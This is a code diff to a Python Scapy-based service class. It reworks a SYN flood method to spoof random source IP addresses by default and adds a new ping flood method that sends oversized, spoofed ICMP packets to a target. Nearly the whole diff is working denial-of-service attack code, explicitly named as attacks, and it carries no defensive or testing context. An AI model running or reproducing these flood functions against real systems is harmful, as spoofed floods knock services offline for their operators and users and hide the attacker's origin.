@@ -2,11 +2,16 @@ from scapy.layers.inet import IP, TCP, ICMP
 from scapy.packet import Raw
 from scapy.sendrecv import send, sr, sr1
 from scapy.volatile import RandShort
-from injectable import injectable
+from injectable import injectable, autowired, Autowired
+from tekleo_common_utils import UtilsRandom
 
 
 @injectable
 class ServiceScapy:
+    @autowired
+    def __init__(self, utils_random: Autowired(UtilsRandom)):
+        self.utils_random = utils_random
+
     # Scanning
     #-------------------------------------------------------------------------------------------------------------------
     # This utilizes TCP stealth scan
@@ -56,23 +61,29 @@ class ServiceScapy:
     #-------------------------------------------------------------------------------------------------------------------
     # A SYN flood attack is a common form of a denial of service attack in which an attacker sends a sequence of SYN requests to the target system
     # https://www.thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python
-    def attack_syn_flood(self, target_ip_address: str, target_port: int, number_of_packets_to_send: int = 1024, size_of_packet: int = 1024 * 4) -> bool:
-        # forge IP packet with target ip as the destination IP address
-        ip = IP(dst=target_ip_address)
-
-        # forge a TCP SYN packet with a random source port
-        # and the target port as the destination port
-        # We also set the flags to "S" which indicates the type SYN.
+    def attack_syn_flood(self, target_ip_address: str, target_port: int, number_of_packets_to_send: int = 1024, size_of_packet: int = 1024 * 4, spoof_source_ip: bool = True) -> bool:
+        ip = None
+        if spoof_source_ip:
+            ip = IP(src=self.utils_random.get_random_ip(), dst=target_ip_address)
+        else:
+            ip = IP(dst=target_ip_address)
         tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
-
-        # add some flooding data (1KB in this case)
-        raw = Raw(b"X"*size_of_packet)
-
-        # stack up the layers
+        raw = Raw(b"X" * size_of_packet)
         p = ip / tcp / raw
-
-        # send the constructed packet in a loop until CTRL+C is detected
         send(p, loop=0, count=number_of_packets_to_send, verbose=0)
         print('ServiceScapy.attack_syn_flood(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip_address + ' on port ' + str(target_port))
+        return True
+
+    def attack_ping_flood(self, target_ip_address: str, number_of_packets_to_send: int = 3, size_of_packet: int = 65500, spoof_source_ip: bool = True) -> bool:
+        ip = None
+        if spoof_source_ip:
+            ip = IP(src=self.utils_random.get_random_ip(), dst=target_ip_address)
+        else:
+            ip = IP(dst=target_ip_address)
+        icmp = ICMP()
+        raw = Raw(b"X" * size_of_packet)
+        p = ip / icmp / raw
+        send(p, loop=0, count=number_of_packets_to_send, verbose=0)
+        print('ServiceScapy.attack_ping_flood(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)
         return True
     #-------------------------------------------------------------------------------------------------------------------
